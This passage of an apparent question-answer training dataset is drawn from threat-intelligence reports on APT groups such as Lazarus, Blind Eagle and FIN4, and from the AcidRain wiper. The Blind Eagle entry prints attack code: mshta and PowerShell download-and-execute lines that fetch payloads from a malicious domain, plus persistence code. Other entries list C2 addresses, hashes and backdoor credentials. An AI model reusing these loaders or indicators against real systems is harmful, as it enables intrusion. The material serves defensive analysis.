to the buffer.\nThe abstraction of the network data shuttling has the added benefit of allowing a malware family to use the same function call regardless of the underlying data format, encrypted or cleartext. The use of this behavior is found in several Lazarus Group families when the initial handshake to establish an encrypted channel requires sending cleartext followed by a switch to an encrypted mode after the handshake has been established. When such a use case occurs, the same send and receive abstract functions can be used, but their encrypted/decrypted mode flags will be the only change the programmers of the core code must concern themselves with.\nMedium Headline: 4.3.4  Directory Hierarchy Verification and Generation\nFrom time to time it is necessary to verify the existence of a particular file path and, if the path fails to exist, create the file path. The Lazarus Group uses a specific function for this task in several of its family members. What makes the code distinguishable is the fact that the function will take a file's full path (e.g. C:\\temp\\folder1\\folder2\\malware.exe) and traverse the entire path. At each level of the directory hierarchy, the code will ensure that the directory exists. At the same time, the code allows the caller of the function to specify if the highest level of the hierarchy is a directory name or a filename. The ability to allow the caller to specify this means the function was originally designed to accommodate both file paths and directory paths.\nThe function that the Lazarus Group uses for ensure a directory hierarchy is as follows:\nThe traversal function begins at the first directory separator (the backslash) and verifies that the path up to that particular point exists by calling GetFileAttributesA to determine if the path if valid or not. If the path to that point is not valid, CreateDirectoryA is called to generate the folder. The process is repeated for each of the additional directories in the path until the final directory separator character is found. If the fLastEntryIsDir flag is set to non-zero by the caller, then the full path is supplied to CreateDirectoryA to attempt to create the final directory. This call will fail, however, if the directory already exists or a file with the same name exists, but the result of this behavior is ignored by the function.\nBig Headline: 5. Conclusion\nCHAPTER\nFive\nUsing the hashes of the malware used in the November 2014 SPE attack, Novetta was able to identify more than 45 malware families due to shared code, encryption keys, and other features across a diverse set of tools. This set of malware has been attributed to a threat actor we have dubbed the Lazarus Group. The Lazarus Group's malware variants have been under active development since at least 2009 and can be tied to publicly related attacks as early as 2007.\nDespite the fact that many of the malware variants are not as sophisticated as many tools attributed to other APT groups, the corpus of malware used by the Lazarus Group is extremely effective and, in multiple cases, responsible for targeted cyber espionage, data theft, and destructive attacks. Notably, as the attack against SPE and other targets have shown, efficient, long-term, and destructive cyber attacks can be orchestrated and executed by this group.\nAnswer this question: Explain the function used by the Lazarus Group for directory hierarchy verification and generation, and how it accommodates both file paths and directory paths.",
    "output": "The Lazarus Group uses a specific function to verify the existence of a file path and create it if it does not exist. The function traverses the entire path, ensuring that each directory exists by calling GetFileAttributesA. If a directory does not exist, CreateDirectoryA is called to generate it. The function allows the caller to specify if the highest level of the hierarchy is a directory name or a filename, accommodating both file paths and directory paths. This flexibility indicates that the function was designed to handle various scenarios efficiently.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the ECAT tool leverage the Recycler folder to uncover relevant artifacts left behind by APT adversaries?",
    "output": "The ECAT tool leverages the Recycler folder to uncover relevant artifacts by exploiting the tendencies of APT adversaries who often fail to clean up after themselves. Since certain directories do not typically contain certain types of files, ECAT queries these directories for files that are out of place. For example, the root of the Recycler folder should not contain any files at all. By requesting ECAT to download C:\\Recycler\\*.*, the analyst can retrieve files that were stored by the adversary, such as net.txt created in 2010, confirming initial suspicions of unauthorized activity dating back to that year.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the evolution of the binary C2 protocol in CARBANAK samples support the theory that the project is distributed to operators rather than centrally managed?",
    "output": "The discovery of five versions of the binary C2 protocol, each improving upon the previous version, suggests ongoing development and adaptation to evade detection. However, the presence of outdated protocol versions in some samples, despite newer versions being available, indicates that not all operators are using the latest builds. This discrepancy suggests that the CARBANAK project is distributed to various operators who may compile their own builds independently, rather than being centrally managed and updated.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Backdoor Liudoor\nFile Size: 87 KB\nMD5: 531d30c8ee27d62e6fbe855299d0e7de\nC2: 0.0.0.0:3433\nThis is a simple backdoor similar to the common Portless Backdoor21 found running as a service on at least five Terracotta VPN victim servers, that RSA Research has dubbed Liudoor. It was installed as Windows\\SysWOW64\\rasauto.dll running as what would be the unused \"RasAuto\" service on victim Windows Server 2008 R2 systems.\nWhile RSA Research did not find the dropper for this backdoor, it could have just as easily been installed with a batch script. This sample binds to TCP port 3433 and waits for an incoming request, probably from a dedicated client used by its operator. It will send the 4 bytes \"pass\", it expects to receive the binary string \"E10ADC3949BA59ABBE56E057F20F883E\" (shown here in ASCII text). This is the MD5 hash of the ASCII string \"123456\". The backdoor process will compare what is passed from the client to that hard coded value, and if successful it will send back \"succ\", if not it will sent back \"fail\".\nOnce the sample has successfully authenticated it will create a thread and pipe data back and forth to the Windows command shell process, cmd.exe. It takes the input and parses the string sent to the sample for 0x0D (the obfuscation XOR key) or carriage return...and then passes everything before that to cmd.exe.  The shell can be halted with the \"exit\" command.  Other hard coded binary options include a certain value that will run the console program \"nbstat.exe\" for NetBIOS network information, which might be useful to its operator for lateral exploitation of other Windows computers on the victim network. RSA Research found similar Backdoor Liudoor files on VirusTotal with the following characteristics:\n78b56bc3edbee3a425c96738760ee40622 listens on port 3340 5aa0510f6f1b0e48f0303b9a4bfc641e23 listens on port 3433 2be2ac65fd97ccc97027184f0310f2f324 listens on port 1234\nOn more recently discovered Terracotta victims, Liudoor was observed to listen on TCP port 64111 or 33911.\n19 http://xiuxiu.web.meitu.com\n20 https://www.virustotal.com/en/file/ad1a507709c75fe93708ce9ca1227c5fefa812997ed9104ff9adfec62a3ec2bb/analysis/\n21 http://www.symantec.com/security_response/writeup.jsp?docid=2003-122516-0717-99&tabid=2\n22 https://www.virustotal.com/en/file/deed6e2a31349253143d4069613905e1dfc3ad4589f6987388de13e33ac187fc/analysis/\n23 https://www.virustotal.com/en/file/4575e7fc8f156d1d499aab5064a4832953cd43795574b4c7b9165cdc92993ce5/analysis/\n24 https://www.virustotal.com/en/file/e42b8385e1aecd89a94a740a2c7cd5ef157b091fabd52cd6f86e47534ca2863e/analysis/\nBig Headline: DETECTING TERRACOTTA ACTIVITY IN RSA SECURITY ANALYTICS AND RSA ECAT\nOrganizations with robust and consistently applied security controls on Internet-facing infrastructure should face little risk that their servers would be enlisted as VPN nodes by Terracotta actors. Two Fortune 500 companies that were identified as victims were exceptions as the comprehensive application of security controls fell short. More threatening to otherwise well-defended organizations is the threat of advanced threat actors originating from legitimate, but compromised, organizations. Any network connection with a Terracotta VPN node should be treated with great suspicion and investigated immediately. Built into RSA Security Analytics is the automatic threat intelligence aggregation and delivery system known as RSA Live. Updated Terracotta node IP addresses are provided in RSA Live as part of the suspect VPN node feed, and available upon request. In Figure 15, RSA Security Analytics has alerted on the Derusbi server handshake parser from RSA Live. It also has alerted on the source of the malicious Derusbi Command and Control (C2) which is a Terracotta node, described as a criminal VPN service exit node by Security Analytics.\nIn Figure 16, a redacted screenshot from RSA Security Analytics shows an alert on a suspicious login to an otherwise secure website from a Terracotta VPN node. Any authentication from Terracotta to an organization's secure websites should be treated as hostile and investigated accordingly.\nBig Headline: DETECTING TERRACOTTA MALWARE USING RSA SECURITY ANALYTICS AND ECAT\n\"An ounce of prevention is worth a pound of cure.\" Certainly this idiom from Ben Franklin applies to efforts to defend against this class of threats (not particularly sophisticated, opportunistic, but potentially very costly). RSA Research assesses that had the Windows firewall been turned on, and the default \"Administrator\" account been renamed in each of the victim systems examined, the systems would not have been compromised with the methods employed by Terracotta. Still, in both large and small organizations, a dichotomy may manifest between a \"Security 101\" policy and application of that policy, especially in development and cloud environments.\nNote: This is not intended to be a cyber-hunter's cookbook for finding Terracotta activity with RSA Security Analytics and ECAT, but rather to offer takeaways on the indicators quickly identified by these tools. The \"out of the box\" Gh0st protocol parser from RSA Live detects the \"cb1st\" Gh0st protocol string used by both the GDS520 and MM523Gh0st RAT variants, highlighted in red in Figure 17.  Security Analytics shows an actual victim system in Iran that was infected with the now-neutralized MM523 Gh0st RAT variant calling-back to a RSA Research sinkhole.\nRSA ECAT will readily detect both Gh0st RAT variants employed by the Terracotta actors. In Figure 18, RSA ECAT has raised the Threat Level scores from low single-digit numbers to well above 100 when the GDS520 Gh0st RAT was installed.\nDouble clicking on the workstation in the RSA ECAT console will bring up details about the system, where an analyst can drill-down into the network connections, and responsible processes. In Figure 19, a Security Operations Center (SOC) analyst would be alerted by (illustrated in red boxes) the high score, the Suspicious Threads, and then hone in on the Gh0st C2 connections identified by RSA ECAT.\nIn our Gh0st RAT malware scenario, the SOC analyst would be able to identify the infections of a server and workstation in RSA Security Analytics. The red boxes in Figure 20 illustrate Gh0st RAT protocol detection and botnet threat categorization by RSA Security Analytics. An analyst also might notice the unusual communications port.\nWhile the particular variant of the Mitozhan Trojan described in this paper's malware analysis section has been neutralized by RSA Research with the seizure of its C2 domain; it is likely that other variants with different C2 domains persist. RSA developed a Lua parser to detect Mitozhan Command and Control (C2) activity, now available through RSA Live and included as an appendix.  Figure 22 is a redacted screenshot showing the Mitozhan Lua parser in action as it alerts on Mitozhan C2 activity on a RSA Research sinkhole.\nMitozhan Trojan is also readily detected upon initial scan with RSA ECAT. Figure 23 shows the initial RSA ECAT console display for the infected system, with initial indicators marked in red boxes.\nWhile RSA ECAT can detect a never-before-seen malware infection out-of-the-box without signatures, a well-prepared SOC will have signatures to help identify the threats behind the malware. That is where the built-in Yara features of RSA ECAT really shine. Yara is an open source tool that helps threat intelligence analysts and malware researchers classify and identify malware with granularity that no antivirus product can match. Using the Yara signature included in the Appendix, our example SOC analyst homes in on a suspicious rasauto.dll process identified by RSA ECAT as unsigned in Figure 24. By right-clicking on the suspicious process, the analyst can initiate a Yara scan using pre-configured rules\nIn this scenario, the SOC analyst has used ECAT to scan the suspicious process. As illustrated with the red box on the right of Figure 25, the Yara result is a confirmed infection with Liudoor.  The Liudoor YARA signature is included in the Appendix\nFor more technical details on how RSA ECAT can be used to proactively detect malware not discovered by traditional methods including antivirus, refer to the whitepaper RSA Incident Response: An APT Case Study.\nhttps://blogs.rsa.com/wp-content/uploads/2015/05/RSA-IR-Case-Study.pdf\nBig Headline: PREVENTION\nTerracotta VPN operators are not using sophisticated methods to harvest their VPN nodes from vulnerable organizations around the world. RSA Research assesses that any one of the following hardening steps would have prevented each of the confirmed victim compromises:\n1 Block port 135 on external router and/or firewall\na. There is no known business-use for having port 135 exposed to the Internet\nb. Recommend: hardware firewall configured with \"allow inbound by exception\" policy\n2 Rename \"Administrator\" account on all Windows systems to a unique alphanumeric name\n3 Use a strong (bi-case letters, numbers plus multiple special characters) 15 character+ password that does not use keyboard patterns\na. Keyboard patterns are found in nearly all password cracking dictionaries\nb. Recommend: regularly change passwords\nIn contrast to the simple security controls that can prevent enlistment of an enterprise's Windows servers into the Terracotta VPN node ecosystem, detecting advanced threat actors who are using Terracotta VPN nodes to hide their origin is more complicated. Infallible prevention may not be possible, and therefore detection is key. Use non-signature-based network analysis and end-point analysis capabilities such as provided by RSA Security Analytics and RSA ECAT to proactively detect and thwart compromise of your organization's network, before your most valuable asset---your information\u2014 is compromised.\nQ: What are the key indicators that RSA Security Analytics and RSA ECAT use to detect Terracotta VPN activity and malware, and how do they enhance the security posture of an organization?",
    "output": "RSA Security Analytics and RSA ECAT use several key indicators to detect Terracotta VPN activity and malware. RSA Security Analytics provides updated Terracotta node IP addresses through RSA Live, alerting on suspicious activities such as the Derusbi server handshake parser and malicious C2 sources. It also detects suspicious logins from Terracotta VPN nodes to secure websites. RSA ECAT detects Gh0st RAT variants and raises Threat Level scores significantly when such malware is installed. It also uses Yara signatures to identify specific malware like Liudoor. These tools enhance an organization's security posture by providing real-time threat intelligence, alerting on suspicious activities, and enabling detailed analysis of potential threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Sednit group's use of spearphishing to steal webmail credentials demonstrate their tactical approach?",
    "output": "The Sednit group uses spearphishing to steal webmail account credentials by creating fake login pages for various webmail services and luring targets into entering their credentials. This method demonstrates a tactical approach aimed at gaining access to sensitive information through deception. By personalizing the fake login panels with the targets' names and email addresses, the group reinforces the illusion of legitimacy, increasing the likelihood of success.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role does threat intelligence play in defending against the IXESHE campaign, and what are the key components of this defense strategy?",
    "output": "Threat intelligence plays a crucial role in defending against the IXESHE campaign by providing indicators that help identify the tools, tactics, and procedures used by the attackers. Key components of this defense strategy include enhanced visibility through endpoint, server, and network monitoring; integrity checks to detect modifications made by malware; and empowering human analysts to identify anomalous behaviors. Technologies like Deep Discovery provide real-time detection and analysis of evasive threats, enhancing the overall defense posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: A BETTER CAMPAIGN FEATURING NEWER TOOLS\nOne specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia. While Blind Eagle attacking Ecuador is not unprecedented, it is still unusual. Similarly to the campaign described above, the geo-filter server in this campaign redirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service:\nIf contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password. But instead of a single executable consisting of some packed RAT, the infection chain, in this case, is much more elaborate:\nInside the RAR archive, there is an executable built with PyInstaller with a rather simplistic Python 3.10 code. This code just adds a new stage in the infection chain:\nimport os\nimport subprocess\nimport ctypes\nctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\nwsx = 'mshta <https://gtly> [.] to/dGBeBqd8z'\nos.system(wsx)\nmshta is a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which contains VBS code embedded in an HTML.\n<script language=\"VBScript\">\nCreateObject(\"Wscript.Shell\").run\"powershell.exe -noexit \"\"$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious domain]/wins''))';$a3=\"\"$a1,$a2\"\";IEX(-join $a3)\"\"\", 0, true\nself.close\n</script>\nUsually campaigns by Blind Eagle abuse legitimate file sharing services such as Mediafire or free dynamic domains like \"*.linkpc.net\"; this case is different, and the next stage is hosted at the malicious domain upxsystems[.]com.\nThis next-stage downloads and executes yet another next-stage, a script written in Powershell:\nfunction StartA{\n[version]$OSVersion = [Environment]::OSVersion.Version\nIf ($OSVersion -gt \"10.0\") {\niex (new-object net.webclient).downloadstring(\"https://[malicious domain]/covidV22/ini/w10/0\")\n} ElseIf ($OSVersion -gt \"6.3\") { iex (new-object net.webclient).downloadstring(\"https://[malicious domain]/covidV22/ini/w8/0\")\n} ElseIf ($OSVersion -gt \"6.2\") {\niex (new-object net.webclient).downloadstring(\"https://[malicious domain]/covidV22/ini/w8/0\")\n} ElseIf ($OSVersion -gt \"6.1\") {\niex (new-object net.webclient).downloadstring(\"http://[malicious domain]/covidV22/ini/w7/0\")\n}\n}\nStartA\nThe above Powershell checks the system version and downloads the appropriate additional Powershell. This additional OS-specific Powershell checks for installed AV tools and behaves differently based on its findings.\nThe main difference between each next stage consists in different pieces of code that will try to disable the security solution (for example Windows Defender), but in all cases, regardless of the type of security solution installed on the computer, the next stagewill download a version of python suitable for the target OS and install it:\nFunction PY(){\nif([System.IntPtr]::Size -eq 4)\n{\n$progressPreference = 'silentlyContinue'\n$url = \"<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>\"\n$output = \"$env:PUBLIC\\\\py.zip\"\n$start_time = Get-Date\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\nNew-Item \"$env:PUBLIC\\\\py\" -type directory\n$FILE=Get-Item \"$env:PUBLIC\\\\py\" -Force\n$FILE.attributes='Hidden'\n$shell = New-Object -ComObject Shell.Application\n$zip = $shell.Namespace(\"$env:PUBLIC\\\\py.zip\")\n$items = $zip.items()\n$shell.Namespace(\"$env:PUBLIC\\\\py\").CopyHere($items, 1556)\nstart-sleep -Seconds 2;\nRemove-Item \"$env:PUBLIC\\\\py.zip\"\nRemove-Item \"$env:USERPROFILE\\\\PUBLIC\\\\Local\\\\Microsoft\\\\WindowsApps\\\\*.*\" -Recurse -Force\nRemove-Item \"$env:USERPROFILE\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\*.*\" -Recurse -Force\nsetx PATH \"$env:path;$env:PUBLIC\\\\py\"\nNew-Item -Path HKCU:\\\\Software\\\\Classes\\\\Applications\\\\python.exe\\\\shell\\\\open\\\\command\\\\ -Value\n\"\"\"$env:PUBLIC\\\\py\\\\python.exe\"\" \"\"%1\"\"\" -Force\nSet-ItemProperty -path 'hkcu:\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MuiCache\\\\' -name \"$env:PUBLIC\\\\py\\\\python.exe.ApplicationCompany\" -value \"Python Software Foundation\"\nSet-ItemProperty -path 'hkcu:\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MuiCache\\\\' -name \"$env:PUBLIC\\\\py\\\\python.exe.FriendlyAppName\" -value \"Python\"\n....\nIt will then download two scripts named mp.py and ByAV2.py which will be stored in the user %Public% folder and for which it will create a scheduled task that will run every 10 minutes. For Windows 7 the task will be created by downloading an XML from the C2 \"upxsystems[.]com\", while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet \"New-ScheduledTask*\".\nIn the case of Windows 7, the task is preconfigured to be executed as System and contains the following description\n<Description> Mantiene actualizado tu software de Google. Si esta tarea se desactiva o se detiene, tu software de Google no se mantendr\u00e1 actualizado, lo que implica que las vulnerabilidades de seguridad que puedan aparecer no podr\u00e1n arreglarse y es posible que algunas funciones no anden. Esta tarea se desinstala autom\u00e1ticamente si ning\u00fan software de Google la utiliza. </Description>\nIt's written using the kind of Spanish that is commonly spoken in the target countries, which can be noticed for example with the use of \"es posible que algunas funciones no anden\" instead of \"no se ejecuten\" or any other variation more common in different geographic regions.\nThe full description can be translated to:\n\"Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, which means that security vulnerabilities that may appear cannot be fixed and some features may not work. This task is automatically uninstalled if no Google software uses it.\"\nAfter downloading the Python scripts and adding persistence, the malware will try to kill all processes related to the infection.\nRegarding the two downloaded scripts, both are obfuscated using homebrew encoding that consists of base64 repeated 5 times (we will never, ever, tire of responding to such design choices with \"known to be 5 times as secure as vanilla base64\"):\nAfter deciphering these strings for each script we obtain two different types of Meterpreter samples.\nThis code consists of an in-memory loader developed in Python, which will load and run a normal Meterpreter sample in DLL format that uses \"tcp://systemwin.linkpc[.]net:443\" as a C2 server.\nPython has a built-in PRNG, and in principle no one is stopping you from constructing a stream cipher based on it, which is what the malware authors do here. The embedded DLL is decrypted using this makeshift \"randint stream cipher\" with an embedded key (in this construction the key is used as the seed to prime the random library). In the grand tradition of cryptography used inside of malware purely to obfuscate buffers using a hardcoded key, the question of how secure this makeshift cipher is has exactly zero consequences.\nThe second script basically consists of another sample of Meterpreter \u2014 this time a version (<https://github.com/rapid7/metasploit-payloads/blob/master/python/meterpreter/meterpreter.py>)developed entirely in Python and using the same C2 server. We can only speculate on why the server was configured to drop the same payload with the same C2 server but written in a different language; possibly one of the samples acts as a plan B in case of the other sample gets detected by some antivirus solution and removed.\nBig Headline: CONCLUSION\nBlind Eagle is a strange bird among APT groups. Judging by its toolset and usual operations, it is clearly more interested in cybercrime and monetary gain than in espionage; however, unlike most such groups that just attack the entire world indiscriminately, Blind Eagle has a very narrow geographical focus, most of the time limited to a single country. This latest campaign targeting Ecuador highlights how, over the last few years, Blind Eagle has matured as a threat \u2014 refining their tools, adding features to leaked code bases, and experimenting with elaborate infection chains and \"Living off the Land\" as seen with the clever abuse of mshta . If what we've seen is any indication, this group is worth keeping an eye on so that victims aren't blindsided by whatever clever thing they try next.\nCheck Point's anti-phishing  for office 365 & G suite analyzes all historical emails in order to determine prior trust relations between the sender and receiver, increasing the likelihood of identifying user impersonation or fraudulent messages. Artificial Intelligence (AI) and Indicators of Compromise (IoCs) used in the past train the (<https://www.checkpoint.com/harmony/email-security/email-office/>)Harmony Email & Office platform for what to look for in complex zero-day phishing attacks.\n\nExplain the significance of Blind Eagle's use of a custom encryption method based on Python's built-in PRNG for obfuscating the Meterpreter DLL. How does this impact the security of the payload?",
    "output": "Blind Eagle's use of a custom encryption method based on Python's built-in pseudo-random number generator (PRNG) for obfuscating the Meterpreter DLL is significant because it adds a layer of complexity to the payload, making it more difficult for analysts to reverse-engineer and understand the malware. However, the security impact of this makeshift 'randint stream cipher' is minimal, as it relies on a hardcoded key used as the seed for the random library. This approach is primarily intended for obfuscation rather than robust encryption, meaning that the payload is not secure against determined analysis. The question of how secure this cipher is has zero consequences in terms of protecting the payload from being eventually decrypted and analyzed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Technical Overview\nAcidRain's functionality is relatively straightforward and takes a bruteforce attempt that possibly signifies that the attackers were either unfamiliar with the particulars of the target firmware or wanted the tool to remain generic and reusable. The binary performs an in-depth wipe of the filesystem and various known storage device files. If the code is running as root, AcidRain performs an initial recursive overwrite and delete of non-standard files in the filesystem.\nRecursively delete files in nonstandard folders\nFollowing this, it attempts to destroy the data in the following storage device files:\nThis wiper iterates over all possible device file identifiers (e.g., mtdblock0 \u2013 mtdblock99), opens the device file, and either overwrites it with up to 0x40000 bytes of data or (in the case of the /dev/mtd* device file) uses the following IOCTLS to erase it: MEMGETINFO, MEMUNLOCK, MEMERASE, and MEMWRITEOOB. In order to make sure that these writes have been committed, the developers run an fsync syscall.\nThe code that generates the malicious data used to overwrite storage\nWhen the overwriting method is used instead of the IOCTLs, it copies from a memory region initialized as an array of 4-byte integers starting at 0xffffffff and decrementing at each index. This matches what  after the exploit had taken place.\nSide-by-side comparison of a Surfbeam2 modem pre- and post-attack\nThe code for both erasure methods can be seen below:\nMechanisms to erase devices: write 0x40000 (left) or use MEM* IOCTLS (right)\nOnce the various wiping processes are complete, the device is rebooted.\nRedundant attempts to reboot the device\nThis results in the device being rendered inoperable.\nRead the text above and answer this question: Why did the AcidRain wiper use a brute-force approach to overwrite and delete files, and how does this reflect on the attackers' knowledge or intentions?",
    "output": "AcidRain's functionality employs a brute-force approach to overwrite and delete files, which suggests two possibilities regarding the attackers' knowledge or intentions. First, it could indicate that the attackers were unfamiliar with the specific details of the target firmware, necessitating a broad and indiscriminate method to ensure effectiveness. Second, it might imply that the attackers intended the tool to be generic and reusable across different systems, rather than tailored to a single target. This approach involves recursively deleting files in nonstandard folders and attempting to destroy data in various storage device files by iterating over all possible device file identifiers. The wiper either overwrites these files with up to 0x40000 bytes of data or uses specific IOCTLS (like MEMGETINFO, MEMUNLOCK, MEMERASE, and MEMWRITEOOB) to erase them, ensuring the writes are committed using an fsync syscall. This comprehensive method ensures that the device is rendered inoperable upon reboot.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nWith access to business critical information, senior executives and consultants are often said to be valuable targets for threat actors tasked with obtaining sensitive business secrets. FIN4 is a financially motivated threat actor which has consistently targeted this population.\nOn 23 June 2015, the press reported that the Securities and Exchange Commission are investigating FIN4's activities[1].\nSince mid-2013, this group is reported[2] to have targeted more than 100 organisations which are primarily NASDAQ and NYSE listed companies or firms working with those listed clients to provide advisory or financial services, such as investment banking. In particular, the FIN4 group has shown a particular interest in the healthcare and pharmaceutical industry and appears to have team members who are intimately familiar with that industry.\nThe group is not a new threat and has been previously reported on by other security companies:\nTowards the end of 2013 security company Esentire released a brief alert (ESOC-2013-11-08[3]) regarding a \"targeted attack against hedge funds\";\nIn May 2014, Symantec released a brief alert (O97M.Ratil[4]) providing further details and mitigations for the threat; and,\nIn November 2014 FireEye released a detailed report on the threat actor, their tactics, techniques and their targets.\nThese reports document two methods of attack used by the FIN4 group: malicious Microsoft Office documents to obtain credentials, and phishing pages designed to mimic Outlook Web App authentication pages.\nOur research into FIN4 has uncovered evidence which indicates that FIN4 also used bespoke malware to harvest credentials and steal documents from compromised victims.\nQ: How does the FIN4 threat actor leverage its knowledge of specific industries to enhance the effectiveness of its attacks?",
    "output": "The FIN4 threat actor leverages its knowledge of specific industries, particularly the healthcare and pharmaceutical industry, to enhance the effectiveness of its attacks by targeting organizations and individuals who are intimately familiar with these sectors. This specialized knowledge allows FIN4 to craft highly tailored and convincing phishing campaigns, malicious documents, and other social engineering tactics that are more likely to deceive senior executives and consultants within these industries. By understanding the nuances and jargon of the healthcare and pharmaceutical sectors, FIN4 can create more credible lures, increasing the likelihood that their targets will fall victim to their schemes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Possible Premera Blue Cross Infrastructure:\nRetrospective analysis of other targeted malware samples using the DTOPTOOLZ Co. digital signature led to the identi\u0141cation of an \"HttpBrowser\" / \"HttpDump\" implant MD5:\n02FAB24461956458D70AEED1A028EB9C[17]\n(OpenOf\u0141cePlugin.exe), which was \u0141rst observed on December 11, 2013. Although this malware sample is not Derusbi / Sakula, it too is strongly believed to be associated with Chinese APT activity and in fact may have also been involved in a Blue Cross Blue Shield\ntargeting campaign as early as December 2013.\n[18]\nThis particular binary is con\u0141gured to connect to the static IP address 142.91.76[.]134. Passive DNS of this IP indicates that on December 11th, 2013, the same date as the malware sample was observed, the domain prennera[.]com also resolved to 142.91.76[.]134. It is believed that the prennera[.]com domain may have been impersonating the Healthcare provider Premera Blue Cross[19], where the attackers used the same character replacement technique by replacing the \"m\" with two \"n\" characters within the faux domain, the same technique that would\nbe seen \u0141ve months later with the we11point[.]com command and control infrastructure.\nBig Headline: VAE Inc. Themed Infrastructure & Signed Malware\nAnother powerful attribute of ThreatConnect is the ability for analysts to logically group items such as atomic indicators, related documents or signatures, all of which may include individualized custom context enrichments and associations. Over time, the ability to memorialize groupings of related or like activity allows analysts to quickly uncover non-obvious relationships within their private datasets. This is exactly what happened as we continued to\ninvestigate these incidents.\nAs industry analysts and media speculated Chinese APT involvement[20] in the Anthem breach, our focus into the Derusbi / Sakula malware signed with the DTOPTOOLZ Co. digital signature shifted from the we11point[.]com incident to another cluster of activity that occurred later in May 2014. We immediately reviewed Incident 20140526B: vaeit APT[21], an incident that we initially shared to our Subscriber Community on September 29, 2014 after conducting retrospective analysis.\n[22]\nJust as was the case with the we11point[.]com and prennera[.]com\nincidents, the VAE, Inc. incident is also believed to be associated with Chinese APT espionage activity. In this case the adversary also used Derusbi / Sakula malware that was signed with the DTOPTOOLZ Co. digital signature and con\u0141gured to communicate with faux infrastructure appearing to be masquerading as internal resources for the Department of Defense Contractor VAE, Inc. Additionally, in response to an inquiry from KrebsOnSecurity,\nVAE, Inc. would later con\u0141rm[24] that it had indeed been a target of a failed spearphishing attempt in May 2014 which used the malicious faux VAE, Inc. themed domain.\nThe targeted incident relied upon the Sakula executable MD5: 230D8A7A60A07DF28A291B13DDF3351F[25] which had a XOR 0x9A encoded C2 callbacks to the IP address 192.199.254[.]126 (registered to Wehostwebsites[.]com \u2013 \"Tom Yu\" of Baoan, Shenzhen City, Guangdong Province, China) as well as a hardcoded callback to sharepoint-vaeit[.]com. Passive DNS of the static C2 IP 192.199.254[.]126 revealed a single suspicious domain of interest \u2013 topsec2014[.]com.  This domain had historic resolution around May 8, 2014 within a month of the \u0141rst observed Sakula activity using the IP 192.199.254[.]126 as C2.\n[26] Using historic Whois, we discovered that topsec2014[.]com was initially registered by li2384826402@yahoo[.]com on May 6th, 2014. Although the li2384826402@yahoo[.]com registrant is likely a reseller given that it has been observed registering several thousands of other domains, the fact that it was used to register both the faux VAE, Inc. C2 infrastructure and the overlapping domain topsec2014[.]com within the same month suggests that there may be a relationship between the client of the reseller for the VAE, Inc. infrastructure and the client for topsec2014[.]com.\n[28]\nRead the text above and answer this question: How did the attackers behind the 'HttpBrowser' / 'HttpDump' malware employ character replacement techniques to impersonate legitimate domains, and what implications does this have for detecting and mitigating such attacks?",
    "output": "The attackers used a character replacement technique to impersonate legitimate domains by slightly altering the spelling. For example, they replaced the 'm' in 'Premera' with two 'n' characters to create the faux domain 'prennera[.]com'. This technique was also seen five months later with the 'we11point[.]com' command and control infrastructure. The implications of this technique are significant for detecting and mitigating such attacks because it highlights the need for advanced detection mechanisms that can identify subtle variations in domain names. Organizations should implement measures such as domain monitoring and typo-squatting detection to catch these types of impersonations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Evaluation of the Malware's Functionality\nThe malware seen in this case study is unusual as it relies on a half-dozen separate executable files, each with a single task, and each communicating via markers dropped in the Registry.\nThe malware is also interesting because it does not provide remote access, but only sends an e-mail containing the victim's IP address and miscellaneous system information. The malware resends the information each time the computer is restarted, but it does not refresh the sent information on restart (which may be a bug). This behaviour strongly suggests that the function of this malware is to serve as a beacon. The system information could be used to identify processes to exploit in the future, however since the attacker has already triggered the execution of a file on the victim's system, it is surprising that more was not taken, or that a RAT (custom or widely available) was not used. A RAT would have provided much greater access alongside IP information\nBy not providing remote access and other RAT functionality, the program looks less like malware, and may attract less attention from endpoint protection tools and scanners. Detections were low when the file was first submitted to VirusTotal, for example. It registered only 6/55 detections by anti virus scanners, or a 10% detection rate.\nTransmitting the malware via e-mail also provides a degree of obscurity, and has the additional advantage of providing a layer of abstraction between the attacker and the target: there is no need to maintain a RAT command-and-control server. The malware transmits autonomously, leaving the material in an inbox for the attacker to collect at a later time.\nThe malware has no obfuscation processes and is not highly technical in its development or interaction with Windows. Nevertheless, we believe that the author of the program is aware of certain techniques to reduce the visibility of malware on a network, including transmitting data via encrypted e-mail communications. However, the attacker has not correctly implemented encrypted e-mail: the malware will not attempt to use a TLS connection in certain cases. As a result, account login credentials may be readily available in network traffic.\nIn addition, the malware uses the old PKWARE implementation of zip encryption, which is not particularly secure. The password for the zipped file is also present in the binary without encryption or obfuscation.\nMedium Headline: Pro-Regime / Regime-Linked 